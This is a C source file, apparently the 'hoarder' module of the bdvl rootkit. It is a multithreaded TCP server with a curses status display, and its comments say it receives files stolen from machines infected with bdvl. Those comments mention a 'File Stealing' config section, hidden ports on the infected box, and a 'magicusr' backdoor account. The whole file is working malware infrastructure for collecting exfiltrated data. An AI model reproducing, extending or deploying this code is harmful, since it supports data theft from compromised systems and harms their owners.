/* this is bdvl's hoarder. this is intended for receiving files from bdvl kitted boxes.
 *
 * in config.ini's 'File Stealing' section you can specify 'hoarder-host'. here you want to put the ip address & port of the thing
 * listening with this.
 *
 * the port specified in hoarder-host must be a hidden port on the box sending the files, otherwise nothing will be sent or received.
 *
 * after bdvl's install & you're magicusr, you can change the target host & port when you like with `./bdv hoarder ...`.
 *
 * this is a multithreaded hoarder, where each thread is responsible for writing a file as it is received.
 * threads act off of activity in a queue, where threads wait for a client in queue & deal with each in order.
 * by default the max size of our queue is 40 clients & number of threads to spawn for them is 10.
 *
 * additionally, curses is used to display notifications of received files & for indicating the status of our queue & thread activity.
 * due to the multithreaded nature of this, running concurrently with curses windows while writing data to them (well only one really)
 * sometimes hiccups the output that you'll see. as in, some thread interrupting another's output as it's printing. that's about as
 * extreme as it'll get. */

#define _GNU_SOURCE

#define MAX_SIMULTANEOUS_CONNECTIONS 40
#define NUMBER_OF_THREADS 10

#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <libgen.h>
#include <time.h> 
#include <pthread.h>
#include <fcntl.h>
#include <limits.h>
#include <curses.h>
#include <sys/stat.h>
#include <sys/socket.h>

static WINDOW *mainwindow;
pthread_mutex_t mutex;
pthread_cond_t cond;
static size_t cwdlen = 0;
static int line_count = 0;
static u_int active_threads = 0;
static char *cwd = NULL;

typedef struct {
    u_short port;
    int sockd;
    struct sockaddr_in sai;
} hoarder_t;

#include "misc.h"
#include "client.h"
#include "dirs.h"
#include "queue.h"
#include "curses.h"
#include "pthread.h"

int initialize_master(hoarder_t hm){
    int master_sock = socket(AF_INET, SOCK_STREAM, 0);
    if(master_sock < 0){
        perror("socket");
        return -1;
    }

    int opt = 1, sopt = setsockopt(master_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    if(sopt < 0){
        perror("setsockopt");
        shutdown(master_sock, SHUT_RDWR);
        close(master_sock);
        return -1;
    }

    hm.sai.sin_family = AF_INET;
    hm.sai.sin_addr.s_addr = htonl(INADDR_ANY);
    hm.sai.sin_port = htons(hm.port);

    if(bind(master_sock, (struct sockaddr*)&hm.sai, sizeof(hm.sai)) < 0){
        perror("bind");
        shutdown(master_sock, SHUT_RDWR);
        close(master_sock);
        return -1;
    }

    if(listen(master_sock, MAX_SIMULTANEOUS_CONNECTIONS) < 0){
        perror("listen");
        shutdown(master_sock, SHUT_RDWR);
        close(master_sock);
        return -1;
    }

    
    return master_sock;
}

void cleanup(int master_sock){
    /* clean up curses-stuff */
    delwin(mainwindow);
    endwin();

    /* terminate active master_sock. */
    shutdown(master_sock, SHUT_RDWR);
    close(master_sock);

    /* clear & free anything we were using.. */
    clean(cwd);
    aclean(q->clients);
    qlean(q);
}

u_short hoard_prepare(char *argv[]){
    u_short rv = (u_short)atoi(argv[1]);
    if(!rv) usgndie(argv[0], cwd);

    /* initialize random seed. */
    srand(time(NULL));

    /* initialize the queue. */
    q = initqueue(MAX_SIMULTANEOUS_CONNECTIONS);
    if(!q){
        perror("initqueue");
        clean(cwd);
        return 0;
    }

    /* initialize mutex. */
    pthread_mutex_init(&mutex, NULL);

    /* curses initialization. */
    initwindows();

    return rv;
}

int main(int argc, char *argv[]){
    if((cwd = getcwd(NULL, 0)) == NULL){
        perror("getcwd");
        return 0;
    }else cwdlen = strlen(cwd);

    if(argc != 2)
        usgndie(argv[0], cwd);

    hoarder_t hm;
    if((hm.port = hoard_prepare(argv)) == 0 || (hm.sockd = initialize_master(hm)) < 0)
        return -1;

    /* create threads. one specially for the titlebar window. */
    pthread_t athreads[NUMBER_OF_THREADS+1];
    pthread_create(&athreads[0], NULL, titlebar_handler, (void*)&hm);
    for(size_t i = 1; i < NUMBER_OF_THREADS+1; i++)
        pthread_create(&athreads[i], NULL, client_handler, NULL);
    
    /* connections successfully accepted are added to the queue if there is space. */
    while(1){
        socklen_t slen = sizeof(hm.sai);
        int newsock = accept(hm.sockd, (struct sockaddr*)&hm.sai, &slen);
        if(newsock != -1){
            aclient_t ca = readclient(newsock, hm.sai.sin_addr);
            queue_add(ca);
        }
    }

    cleanup(hm.sockd);
    return 0;
}